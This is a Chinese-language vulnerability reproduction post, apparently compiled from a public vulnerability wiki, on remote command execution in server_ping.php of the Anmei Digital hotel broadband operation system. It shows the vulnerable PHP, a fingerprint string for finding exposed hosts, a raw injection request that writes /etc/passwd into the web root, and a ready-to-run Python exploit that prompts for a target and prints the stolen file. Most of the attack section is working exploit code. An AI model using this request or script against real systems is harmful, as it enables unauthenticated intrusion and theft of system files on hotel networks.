---
title: "安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞"
date: 2026-10-16 09:10:38
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "安美数字-酒店宽带运营系统"
tags:
  - "安美数字-酒店宽带运营系统"
  - "命令执行"
  - "漏洞复现"
---
# 漏洞描述

安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行

## 漏洞影响

```
安美数字 酒店宽带运营系统
```

## 网络测绘

```
"酒店宽带运营"
<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">
## 漏洞复现

登录页面如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101906343.png)



存在漏洞的文件为 **server_ping.php**



```php
&lt;?
if (!isset($ip) || $ip == "" || !isset($id) || $id == "") exit;

$cmd = "ping -c 2 -s 65 $ip";
$fp = &#112;open($cmd, "r");
$getString = "";
if ($fp) {
	while (($line = fgets($fp, 512))) {
		$getString .= trim($line);
	}
	pclose($fp);
	
}

if (strstr($getString, "2 received, 0%")) {
	echo "&lt;html&gt;&lt;body&gt;&lt;script language=\"javascript\"&gt;\n";
	echo "parent.doTestResult('$id', 'ok');\n";
	echo "&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n";
} else {
	echo "&lt;html&gt;&lt;body&gt;&lt;script language=\"javascript\"&gt;\n";
	echo "parent.doTestResult('$id', 'no');\n";
	echo "&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n";
}
?&gt;</code></pre>

</details>



漏洞位置为



<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-plain">$cmd = "ping -c 2 -s 65 $ip";
$fp = &#112;open($cmd, "r");</code></pre>

</details>



GET传入 **$ip参数** 后直接命令执行，并且文件无权限要求



请求包为



```plain
GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101907634.png)

## 漏洞POC



```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞            \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1"
    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
        print("\033[36m[o] 正在执行 cat /etc/passwd>../../test.txt \033[0m".format(target_url))
        if "parent" in response.text and response.status_code == 200:
            vuln_url = target_url + "/test.txt"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)
            if "root:" in response.text:
                print("\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\n{} \033[0m".format(response.text))
            else:
                print("\033[31m[x] 请求失败:{} \033[0m")
        else:
            print("\033[31m[x] 请求失败 \033[0m")
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

#
if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    POC_1(target_url)
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101907822.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97-%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F-server_ping.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
